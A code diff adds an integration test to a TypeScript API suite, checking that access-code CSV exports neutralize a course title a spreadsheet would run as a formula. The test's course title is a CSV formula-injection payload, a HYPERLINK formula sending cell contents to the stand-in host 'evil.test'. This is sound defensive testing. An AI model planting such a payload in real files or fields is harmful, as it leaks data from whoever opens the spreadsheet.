@@ -107,6 +107,20 @@ describe("Access Code Batches API (Integration)", () => {
       expect(JSON.stringify(createAudit?.meta)).not.toContain(body.codes[0]!.code);
     });
 
+    // Step 10.3 (audit lead code-batches.service.ts:create:csv-formula-injection-course-title).
+    it("neutralizes a course title that a spreadsheet would run as a formula", async () => {
+      const t = await fx.tenant();
+      const teacher = await fx.staffLogin(t, "teacher");
+      const course = await systemPrisma.course.create({
+        data: { tenantId: t.id, title: '=HYPERLINK("https://evil.test/?c="&B2,"x")' },
+      });
+      const res = await as(t, teacher.cookie, "POST", "/code-batches", { courseId: course.id, count: 1, name: "F" });
+      expect(res.status).toBe(201);
+      const row = (res.body as { csv: string }).csv.trim().split("\n")[1]!;
+      expect(row).toContain(`"'=HYPERLINK(`);
+      expect(row).not.toContain(`,"=HYPERLINK(`);
+    });
+
     it("rejects count out of range (count > 500 or count < 1)", async () => {
       const t = await fx.tenant();
       const teacher = await fx.staffLogin(t, "teacher");
